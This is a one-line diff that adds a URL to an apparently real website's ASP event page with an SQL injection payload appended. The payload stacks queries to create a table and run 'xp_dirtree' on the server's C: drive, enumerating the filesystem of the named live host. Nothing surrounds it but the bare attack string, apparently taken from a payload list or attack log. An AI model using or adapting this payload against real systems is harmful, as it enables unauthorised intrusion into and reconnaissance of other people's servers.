@@ -1,0 +1,1 @@
+﻿http://www.sftm.com.cn/event_detail.asp?ClassID=0204&id=890;CREATE%20TABLE%20TMP([ID]%20int%20IDENTITY%20(1,1)%20NOT%20NULL,[name]%20[nvarchar]%20(300)%20NOT%20NULL,[depth]%20[int]%20NOT%20NULL,[isfile]%20[nvarchar]%20(50)%20NULL);insert%20into%20tmp%20exec%20master..xp_dirtree%20%27c:/%27,1,1--
